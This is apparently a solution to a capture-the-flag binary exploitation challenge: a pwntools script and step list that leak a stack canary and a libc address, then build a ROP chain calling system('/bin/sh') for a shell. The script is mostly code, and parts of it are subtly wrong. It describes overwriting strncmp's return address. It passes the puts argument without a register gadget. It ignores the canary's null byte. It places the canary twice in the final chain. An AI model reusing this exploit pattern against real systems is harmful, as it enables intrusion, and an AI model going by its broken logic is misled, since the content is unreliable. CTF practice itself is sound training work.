To solve this challenge using pwntools, we need to follow a structured approach. Given the provided information, here are the steps and the corresponding code:

### Step 1: Analyze the Vulnerability
The `hello` function reads 256 bytes into a buffer of size 24, which is a classic buffer overflow vulnerability. We can overwrite the return address and control the execution flow.

### Step 2: Bypass Security Mechanisms
- **Full RELRO**: This makes it difficult to overwrite GOT entries.
- **Stack Canary**: We need to leak the canary value to bypass it.
- **PIE (ASLR for the binary)**: We need to leak a memory address to defeat ASLR.
- **NX**: We cannot execute code on the stack, so we need to use ROP.

### Step 3: Leak the Stack Canary and Base Address
We can leak the stack canary by overwriting the return address of `strncmp` with the address of `puts` and passing the canary's address as an argument. Similarly, we can leak a libc address to defeat ASLR.

### Step 4: Construct the ROP Chain
Once we have the necessary addresses, we can construct a ROP chain to call `system("/bin/sh")`.

### Step 5: Write the Exploit Script

Here is the Python script using pwntools to exploit the binary:

```python
from pwn import *

# Set up the process or remote connection
context.binary = './rop'
elf = context.binary
if args.REMOTE:
    p = remote('host', port)
else:
    p = process(elf.path)

# Function to interact with the binary
def send_payload(payload):
    p.sendlineafter(b'What\'s your name?\n', payload)
    p.sendlineafter(b'correct (yes/no)?\n', b'no')

# Leak the stack canary
canary_offset = 24
canary_leak_payload = b'A' * canary_offset
send_payload(canary_leak_payload)
p.recvuntil(b'Is your name `')
canary = u64(p.recv(8))
log.info(f'Leaked canary: {hex(canary)}')

# Leak a libc address (e.g., puts)
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']

leak_libc_payload = flat({
    canary_offset: canary,
    canary_offset + 8: puts_plt,
    canary_offset + 16: main,
    canary_offset + 24: puts_got
})
send_payload(leak_libc_payload)

# Receive the leaked libc address
p.recvuntil(b'Is your name `')
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f'Leaked puts address: {hex(puts_addr)}')

# Calculate the base address of libc
libc = ELF('./libc.so.6')
libc_base = puts_addr - libc.symbols['puts']
log.info(f'Libc base address: {hex(libc_base)}')

# Find the system and "/bin/sh" addresses
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

# Construct the final ROP chain
rop = ROP(elf)
rop.raw(canary)
rop.raw(b'B' * 8)  # Overwrite rbp
rop.call(system_addr, [bin_sh_addr])

# Send the final payload
final_payload = flat({
    canary_offset: rop.chain()
})
send_payload(final_payload)

# Interact with the shell
p.interactive()
```

### Explanation of the Script
1. **Setup and Context**: Set up the process or remote connection and define the binary context.
2. **Leak the Stack Canary**: Craft a payload to leak the stack canary.
3. **Leak a Libc Address**: Use the leaked canary to craft a payload to leak a libc address (e.g., `puts`).
4. **Calculate Libc Base Address**: Calculate the base address of libc.
5. **Construct the ROP Chain**: Build the ROP chain to call `system("/bin/sh")`.
6. **Send the Final Payload**: Send the final payload to get a shell.
7. **Interact with the Shell**: Interact with the shell once the exploit is successful.

Make sure to replace `'host'` and `port` with the actual host and port if you are connecting to a remote server. Also, ensure that the paths to the binary and libc file are correct.
